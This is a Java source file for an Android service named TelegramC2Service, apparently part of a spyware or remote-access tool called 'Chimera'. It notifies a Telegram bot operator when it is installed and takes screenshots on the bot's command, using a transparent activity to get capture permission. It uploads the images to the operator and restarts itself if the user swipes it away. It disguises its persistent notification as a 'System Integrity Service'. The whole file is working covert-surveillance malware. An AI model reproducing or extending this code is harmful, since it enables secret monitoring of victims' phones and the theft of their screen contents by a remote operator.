package com.chimera;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.hardware.display.VirtualDisplay;
import android.media.Image;
import android.media.ImageReader;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.DisplayMetrics;
import android.view.WindowManager;

import java.io.File;
import java.io.FileOutputStream;
import java.nio.ByteBuffer;

public class TelegramC2Service extends Service {

    private Thread workerThread;
    private HandlerThread screenshotThread;
    private Handler screenshotHandler;
    private ImageReader imageReader;
    private VirtualDisplay virtualDisplay;
    private MediaProjection mediaProjection;
    private MediaProjectionManager projectionManager;

    private static final String CHANNEL_ID = "ChimeraServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    @Override
    public void onCreate() {
        super.onCreate();

        try {
            ConfigLoader.load(this);
            sendInstallMessage();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_Config", e);
        }

        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());

        startWorker();

        screenshotThread = new HandlerThread("ScreenshotHandler");
        screenshotThread.start();
        screenshotHandler = new Handler(screenshotThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.getAction() != null) {
            String action = intent.getAction();
            switch (action) {
                case "ACTION_PREPARE_SCREENSHOT":
                    // This action is triggered by the Telegram bot. It starts the transparent activity.
                    Intent activityIntent = new Intent(this, ScreenshotActivity.class);
                    activityIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(activityIntent);
                    break;
                case "ACTION_SCREENSHOT_RESULT":
                    // This action is triggered by ScreenshotActivity after the user responds to the prompt.
                    int resultCode = intent.getIntExtra("resultCode", Activity.RESULT_CANCELED);
                    Intent resultData = intent.getParcelableExtra("resultData");

                    if (resultCode == Activity.RESULT_OK && resultData != null) {
                        // Permission was granted. Start the capture.
                        handleScreenshotResult(resultCode, resultData);
                    } else {
                        // Permission was denied. Inform the operator.
                        TelegramBotWorker.sendMessage("Screenshot permission was denied.", this);
                    }
                    break;
            }
        }
        return START_STICKY;
    }

    private void handleScreenshotResult(int resultCode, Intent data) {
        try {
            // Required for Android Q and above to run MediaProjection from a service
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIFICATION_ID, createNotification(), ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
            }

            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection != null) {
                // Set a callback to clean up when the projection session ends
                mediaProjection.registerCallback(new MediaProjection.Callback() {
                    @Override
                    public void onStop() {
                        super.onStop();
                        stopScreenshot();
                    }
                }, screenshotHandler);
                captureScreenshot();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "HandleScreenshotResult", e);
            TelegramBotWorker.sendMessage("Failed to start screenshot projection: " + e.getMessage(), this);
        }
    }

    private void captureScreenshot() {
        try {
            WindowManager wm = (WindowManager) getSystemService(WINDOW_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            wm.getDefaultDisplay().getRealMetrics(metrics);

            int width = metrics.widthPixels;
            int height = metrics.heightPixels;
            int density = metrics.densityDpi;

            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);

            virtualDisplay = mediaProjection.createVirtualDisplay(
                    "ChimeraScreenCapture", width, height, density,
                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                    imageReader.getSurface(), null, screenshotHandler
            );

            // Add a small delay to ensure the display is ready before capturing
            screenshotHandler.postDelayed(() -> {
                Image image = null;
                try {
                    image = imageReader.acquireLatestImage();
                    if (image != null) {
                        Image.Plane[] planes = image.getPlanes();
                        ByteBuffer buffer = planes[0].getBuffer();
                        int pixelStride = planes[0].getPixelStride();
                        int rowStride = planes[0].getRowStride();
                        int rowPadding = rowStride - pixelStride * width;

                        Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                        bitmap.copyPixelsFromBuffer(buffer);

                        // We might need to crop the padding
                        Bitmap croppedBitmap = Bitmap.createBitmap(bitmap, 0, 0, width, height);
                        bitmap.recycle(); // recycle the original

                        File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
                        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
                            croppedBitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
                        }
                        croppedBitmap.recycle();

                        TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(), ConfigLoader.getAdminId(), "Screenshot", this);

                    } else {
                         TelegramBotWorker.sendMessage("Failed to acquire image for screenshot.", this);
                    }
                } catch (Exception e) {
                    ErrorLogger.logError(this, "ScreenshotCapture", e);
                    TelegramBotWorker.sendMessage("Exception during screenshot capture: " + e.getMessage(), this);
                } finally {
                    if (image != null) image.close();
                    // IMPORTANT: Stop the projection immediately after capture to release resources
                    stopScreenshot();
                }
            }, 300); // 300ms delay

        } catch (Exception e) {
            ErrorLogger.logError(this, "captureScreenshotSetup", e);
            TelegramBotWorker.sendMessage("Failed to setup screenshot capture: " + e.getMessage(), this);
            stopScreenshot();
        }
    }

    private void stopScreenshot() {
        // Release all projection resources
        if (virtualDisplay != null) {
            virtualDisplay.release();
            virtualDisplay = null;
        }
        if (mediaProjection != null) {
            mediaProjection.stop();
            mediaProjection = null;
        }
        if (imageReader != null) {
            imageReader.close();
            imageReader = null;
        }
    }

    // --- Service Lifecycle and Worker Management ---

    private void startWorker() {
        try {
            if (workerThread == null || !workerThread.isAlive()) {
                workerThread = new Thread(new TelegramBotWorker(this));
                workerThread.start();
            }
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_StartWorker", e);
        }
    }

    private void sendInstallMessage() {
        String installMessage = "Chimera installed and running on device: " + Build.MANUFACTURER + " " + Build.MODEL + " (Android " + Build.VERSION.RELEASE + ")";
        TelegramBotWorker.sendMessage(installMessage, this);
    }


    @Override
    public void onDestroy() {
        try {
            if (workerThread != null) workerThread.interrupt();
            if (screenshotThread != null) screenshotThread.quitSafely();
            stopScreenshot();
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnDestroy", e);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        // This ensures the service restarts if the app is swiped away from recent apps
        try {
            Intent restartIntent = new Intent(getApplicationContext(), this.getClass());
            restartIntent.setPackage(getPackageName());
            PendingIntent pi = PendingIntent.getService(getApplicationContext(), 1, restartIntent, PendingIntent.FLAG_ONE_SHOT | PendingIntent.FLAG_IMMUTABLE);
            AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            am.set(AlarmManager.ELAPSED_REALTIME, System.currentTimeMillis() + 1000, pi);
        } catch (Exception e) {
            ErrorLogger.logError(this, "TelegramC2Service_OnTaskRemoved", e);
        }
        super.onTaskRemoved(rootIntent);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "System Service", NotificationManager.IMPORTANCE_LOW);
            channel.setDescription("Required for background operations.");
            getSystemService(NotificationManager.class).createNotificationChannel(channel);
        }
    }

    private Notification createNotification() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE);

        return new Notification.Builder(this, CHANNEL_ID)
                .setContentTitle("System Integrity Service")
                .setContentText("Monitoring device status.")
                .setSmallIcon(R.drawable.ic_launcher_foreground) // Use your app's icon
                .setContentIntent(pendingIntent)
                .build();
    }
}